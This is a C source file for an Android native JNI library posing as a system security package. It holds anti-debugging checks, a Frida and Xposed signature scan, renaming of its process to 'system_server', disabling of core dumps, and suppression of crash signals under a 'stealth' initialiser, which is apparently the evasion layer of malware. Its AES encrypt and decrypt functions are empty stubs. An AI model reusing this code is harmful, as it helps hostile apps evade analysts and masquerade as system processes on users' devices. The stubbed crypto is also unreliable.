#include <jni.h>
#include <android/log.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <dlfcn.h>
#include <errno.h>
#include <time.h>

#define LOG_TAG "NativeCore"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// ============================================================
// ANTI-DEBUGGING
// ============================================================

JNIEXPORT jboolean JNICALL
Java_com_android_system_security_NativeBridge_isDebuggerAttached(JNIEnv *env, jclass clazz) {
    // Check /proc/self/status for TracerPid
    char buf[256];
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd < 0) return JNI_FALSE;

    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return JNI_FALSE;
    buf[n] = '\0';

    char *tracer = strstr(buf, "TracerPid:");
    if (tracer != NULL) {
        int pid = atoi(tracer + 10);
        if (pid > 0) return JNI_TRUE;
    }

    // Check if ptrace is already in use (anti-anti-debug bypass)
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
        // Can't trace — someone's already debugging us
        LOGW("ptrace failed: already being traced");
        return JNI_TRUE;
    }
    // Release trace
    ptrace(PTRACE_DETACH, 0, NULL, NULL);

    return JNI_FALSE;
}

// ============================================================
// FRIDA DETECTION
// ============================================================

JNIEXPORT jboolean JNICALL
Java_com_android_system_security_NativeBridge_detectFrida(JNIEnv *env, jclass clazz) {
    // Scan /proc/self/maps for Frida libraries
    FILE *fp = fopen("/proc/self/maps", "r");
    if (fp == NULL) return JNI_FALSE;

    char line[512];
    const char *frida_signatures[] = {
        "frida", "frida-agent", "frida-gadget", "libriru",
        "libxposed", "gum-js", "gum", "capstone",
        NULL
    };

    while (fgets(line, sizeof(line), fp) != NULL) {
        for (int i = 0; frida_signatures[i] != NULL; i++) {
            if (strstr(line, frida_signatures[i]) != NULL) {
                fclose(fp);
                LOGW("Frida detected: %s", line);
                return JNI_TRUE;
            }
        }

        // Check for D-Bus (Frida communication protocol)
        if (strstr(line, "dbus") != NULL) {
            fclose(fp);
            return JNI_TRUE;
        }
    }
    fclose(fp);

    // Check for Frida pipes/sockets
    char pipe_path[64];
    for (int i = 0; i < 256; i++) {
        snprintf(pipe_path, sizeof(pipe_path), "/data/local/tmp/frida-%d", i);
        if (access(pipe_path, F_OK) == 0) {
            LOGW("Frida pipe found: %s", pipe_path);
            return JNI_TRUE;
        }
    }

    return JNI_FALSE;
}

// ============================================================
// PROCESS HIDING
// ============================================================

JNIEXPORT void JNICALL
Java_com_android_system_security_NativeBridge_hideProcess(JNIEnv *env, jclass clazz) {
    // Override /proc/self/comm
    int fd = open("/proc/self/comm", O_WRONLY);
    if (fd >= 0) {
        write(fd, "system_server", 13);
        close(fd);
    }

    // Override /proc/self/cmdline via memfd trick
    // We overwrite the argv area if accessible
    // Note: requires knowing the exact memory layout
}

// ============================================================
// STEALTH INIT
// ============================================================

JNIEXPORT void JNICALL
Java_com_android_system_security_NativeBridge_initStealth(JNIEnv *env, jclass clazz) {
    LOGI("Initializing native stealth layer...");

    // Block core dumps
    int ret = prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    if (ret == 0) {
        LOGI("Core dumps disabled");
    }

    // Hide from crash dump captures
    signal(SIGQUIT, SIG_IGN);
    signal(SIGSEGV, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);

    // Hide process name
    Java_com_android_system_security_NativeBridge_hideProcess(env, clazz);

    LOGI("Native stealth initialized");
}

// ============================================================
// NATIVE CRYPTO (AES-256)
// ============================================================

// Simple AES-256-CBC implementation (for environments without Java crypto)
// Uses OpenSSL if available, otherwise software implementation

static void xor_block(unsigned char *out, const unsigned char *a, const unsigned char *b) {
    for (int i = 0; i < 16; i++) out[i] = a[i] ^ b[i];
}

// Placeholder for full AES implementation
// In production, link against OpenSSL or BoringSSL

JNIEXPORT jbyteArray JNICALL
Java_com_android_system_security_NativeBridge_nativeEncrypt(
    JNIEnv *env, jclass clazz, jbyteArray plaintext, jbyteArray key) {

    // Try to use OpenSSL's AES if available
    // Fallback: return encrypted data via Java crypto instead
    return NULL; // Fall through to Java implementation
}

JNIEXPORT jbyteArray JNICALL
Java_com_android_system_security_NativeBridge_nativeDecrypt(
    JNIEnv *env, jclass clazz, jbyteArray ciphertext, jbyteArray key) {
    return NULL; // Fall through to Java implementation
}

// ============================================================
// ENTROPY SOURCE
// ============================================================

JNIEXPORT jbyteArray JNICALL
Java_com_android_system_security_NativeBridge_getSecureRandomBytes(
    JNIEnv *env, jclass clazz, jint length) {

    unsigned char *buf = malloc(length);
    if (buf == NULL) return NULL;

    // Use /dev/urandom directly (bypass Java SecureRandom limitations)
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) {
        read(fd, buf, length);
        close(fd);
    } else {
        // Fallback: use getrandom syscall
        syscall(SYS_getrandom, buf, length, 0);
    }

    jbyteArray result = (*env)->NewByteArray(env, length);
    (*env)->SetByteArrayRegion(env, result, 0, length, (jbyte *)buf);

    free(buf);
    return result;
}

// ============================================================
// JNI ONLOAD
// ============================================================

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    LOGI("Native core library loaded");
    return JNI_VERSION_1_6;
}
